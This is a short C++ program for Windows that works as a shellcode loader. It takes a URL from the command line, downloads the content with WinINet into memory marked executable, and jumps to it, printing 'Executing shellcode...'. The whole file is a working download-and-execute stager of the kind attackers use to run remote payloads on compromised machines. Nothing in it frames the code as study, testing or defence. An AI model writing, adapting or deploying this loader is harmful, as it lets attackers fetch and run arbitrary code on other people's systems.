#include <windows.h>
#include <wininet.h>
#include <iostream>
#include <cstdlib>

#pragma comment(lib, "wininet.lib")

int main(int argc, char* argv[]) {
    if (argc != 2) {
        std::cerr << "Usage: " << argv[0] << " <url>" << std::endl;
        return 1;
    }

    const char* url = argv[1];

    // Open internet session
    HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        std::cerr << "[-] InternetOpenA failed" << std::endl;
        return 1;
    }

    // Open URL
    HINTERNET hFile = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hFile) {
        std::cerr << "[-] InternetOpenUrlA failed" << std::endl;
        InternetCloseHandle(hInternet);
        return 1;
    }

    // Get content length
    char sizeBuf[256] = {0};
    DWORD sizeLen = sizeof(sizeBuf);
    DWORD fileSize = 0;
    if (HttpQueryInfoA(hFile, HTTP_QUERY_CONTENT_LENGTH, sizeBuf, &sizeLen, 0)) {
        fileSize = atoi(sizeBuf);
    } else {
        std::cerr << "[-] Failed to get content length" << std::endl;
        InternetCloseHandle(hFile);
        InternetCloseHandle(hInternet);
        return 1;
    }

    // Allocate memory
    BYTE* shellcode = (BYTE*)VirtualAlloc(NULL, fileSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!shellcode) {
        std::cerr << "[-] VirtualAlloc failed" << std::endl;
        InternetCloseHandle(hFile);
        InternetCloseHandle(hInternet);
        return 1;
    }

    // Download shellcode
    DWORD bytesRead = 0;
    if (!InternetReadFile(hFile, shellcode, fileSize, &bytesRead) || bytesRead != fileSize) {
        std::cerr << "[-] InternetReadFile failed or incomplete" << std::endl;
        VirtualFree(shellcode, 0, MEM_RELEASE);
        InternetCloseHandle(hFile);
        InternetCloseHandle(hInternet);
        return 1;
    }

    InternetCloseHandle(hFile);
    InternetCloseHandle(hInternet);

    std::cout << "[+] Downloaded " << bytesRead << " bytes. Executing shellcode..." << std::endl;

    // Execute the shellcode
    void (*func)() = reinterpret_cast<void(*)()>(shellcode);
    func();

    return 0;
}
